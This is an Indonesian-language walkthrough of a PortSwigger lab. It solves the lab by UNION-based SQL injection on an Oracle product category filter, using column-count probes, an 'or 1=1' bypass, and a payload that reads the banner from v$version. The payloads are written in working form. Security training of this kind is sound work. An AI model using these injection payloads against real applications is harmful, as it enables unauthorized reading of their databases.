# SQL Injection Attack: Querying the Database Type and Version on Oracle

Lab ini berisi kerentanannya dalam SQL injection pada filter kategori produk. Anda dapat menggunakan serangan UNION untuk mendapatkan hasil dari query yang disuntikkan.

Untuk menyelesaikan lab ini, tampilkan string versi database.

---

### **Pertimbangan Utama: Menanyakan di Oracle**

Di database Oracle, setiap pernyataan `SELECT` harus menyebutkan tabel yang akan di-query. Jika serangan `UNION SELECT` Anda tidak merujuk ke tabel, Anda harus menyertakan kata kunci `FROM` diikuti dengan nama tabel yang valid. Oracle menyediakan tabel bawaan yang disebut `dual` yang dapat digunakan untuk tujuan ini. Misalnya:
```sql
UNION SELECT 'abc' FROM dual
```

---

### **Langkah-langkah Melakukan Serangan**

#### **Langkah 1: Analisis Struktur Query**
Dengan menyuntikkan payload berikut:
```
/filter?category=Gifts'--
```
Aplikasi kemungkinan besar akan menjalankan query seperti ini:
```sql
SELECT description, content 
FROM posts 
WHERE category = 'Gifts';
```
Query ini:
- Mengembalikan dua kolom: `description` dan `content`.

#### **Langkah 2: Tentukan Jumlah Kolom**
Untuk mengetahui jumlah kolom dalam query asli, suntikkan:
```
/filter?category=Gifts'+union+all+select+NULL,NULL+FROM+dual--
```
Jika tidak ada kesalahan, query tersebut memiliki dua kolom.

#### **Langkah 3: Ekstrak Versi Database**
Database Oracle menyimpan informasi versi dalam tabel seperti `v$version` dan `v$instance`. Untuk mengambil string versi:
1. Gunakan tabel `v$version`:
   ```sql
   SELECT banner FROM v$version;
   ```
2. Suntikkan payload berikut:
   ```
   /filter?category=Gifts'+union+all+select+'1',banner+FROM+v$version--
   ```

#### **Langkah 4: Menangani Kesalahan Potensial**
Menggunakan tabel `v$instance` mungkin menghasilkan kesalahan:
```
SELECT version FROM v$instance;
```
Hindari ini jika server menolak query terhadap `v$instance`.

---

### **Payload yang Valid**

#### **Payload Uji Awal**:
- Menampilkan 4 item di kategori "Gifts":
  ```
  /filter?category=Gifts'--
  ```
- Menampilkan semua item dengan bypass:
  ```
  /filter?category=Gifts'+or+1=1--
  ```

#### **Tentukan Jumlah Kolom**:
- Gunakan:
  ```
  /filter?category=Gifts'+union+all+select+NULL,NULL+FROM+dual--
  ```

#### **Ambil Versi Database**:
- Gunakan `v$version`:
  ```
  /filter?category=Gifts'+union+all+select+'1',banner+FROM+v$version--
  ```

---

### **Referensi**

- [Menguji Database Menggunakan SQL Injection](https://portswigger.net/web-security/sql-injection/examining-the-database)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

### **Ilustrasi**

#### **Tampilan Awal (Deskripsi dan Konten)**:
![img](images/SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20Oracle/1.png)

#### **Validasi Jumlah Kolom**:
![img](images/SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20Oracle/2.png)

#### **Mengambil Versi Database**:
Menggunakan payload:
```
/filter?category=Gifts'+union+all+select+'1',banner+FROM+v$version--
```

Query tersebut mengembalikan versi database:
```
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```
